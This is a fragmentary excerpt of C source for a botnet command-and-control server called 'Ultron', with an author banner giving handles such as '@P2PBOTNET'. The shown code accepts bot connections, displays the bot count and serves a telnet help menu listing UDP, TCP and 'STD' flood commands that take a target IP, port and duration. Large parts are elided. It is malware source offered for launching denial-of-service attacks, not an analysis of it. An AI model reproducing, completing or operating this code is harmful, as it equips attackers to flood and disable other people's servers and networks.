/*
Title: Ultron Server Side
Made By: ~B1NARY~
Made Date: 7-1-18

Xmpp: b1nary@nigge.rs
Twitter: @P2PBOTNET
Instragram: @botkillerzondeck
                ...
                for (i = 0; i < n; i++)
                {
                        ...
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        ...
                                        if(dup) 
                                        {
                                                if(send(infd, "!* LMFAO\n", 9, MSG_NOSIGNAL) == -1) { close(infd); continue; }
...
void *titleWriter(void *sock)
{
        ...
        while(1)
        {
                ...
                sprintf(string, "%c]0;[%d]%c", '\033', clientsConnected(), '\007');
...
void *telnetWorker(void *sock)
{
        ...
        {	
			if(strstr(buf, "HELP") || strstr(buf, "help") || strstr(buf, "?"))
			{
				...
				if(send(thefd, "UATK - !* UDP IP PORT SEC 0 10\r\n", 32, MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, "TATK - !* TCP IP PORT SEC 32 all 0 10\r\n", 39, MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, "SATK - !* STD IP PORT SEC\r\n", 27, MSG_NOSIGNAL) == -1) goto end;
			}
